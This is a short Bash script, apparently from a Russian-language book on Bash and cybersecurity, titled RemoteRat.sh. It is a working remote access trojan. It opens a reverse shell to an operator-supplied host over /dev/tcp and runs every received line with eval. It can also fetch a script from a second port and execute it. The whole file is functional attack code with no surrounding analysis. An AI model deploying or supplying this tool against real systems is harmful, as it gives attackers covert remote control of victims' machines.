#!/bin/bash -
#
# Bash и кибербезопасность
# RemoteRat.sh
#
# Описание:
# Инструмент удаленного доступа для запуска в удаленной системе;
"# в основном передает любые входные данные в оболочку,"
"# но если указан !, извлекает и запускает сценарий"
#
# Использование: RemoteRat.sh hostname port1 [port2 [port3]]
#
function cleanup ()
{
rm -f $TMPFL
}
function runScript ()
{
"# передаем, какой сценарий нам нужен"
echo "$1" > /dev/tcp/${HOMEHOST}/${HOMEPORT2}
# останов
sleep 1
if [[ $1 == 'exit' ]] ; then exit ; fi
cat > $TMPFL </dev/tcp/${HOMEHOST}/${HOMEPORT3}
bash $TMPFL
}
# ------------------- MAIN -------------------
# здесь может быть выполнена проверка некоторых ошибок
HOMEHOST=$1
HOMEPORT=$2
HOMEPORT2=${3:-$((HOMEPORT+1))}
HOMEPORT3=${4:-$((HOMEPORT2+1))}
TMPFL="/tmp/$$.sh"
trap cleanup EXIT
# звонок домой:
exec </dev/tcp/${HOMEHOST}/${HOMEPORT} 1>&0 2>&0
while true
do
echo -n '$ '
read -r
if [[ ${REPLY:0:1} == '!' ]]
then
# это сценарий
FN=${REPLY:1}
runScript $FN
else
# обычный случай — запустить cmd
eval "$REPLY"
fi
done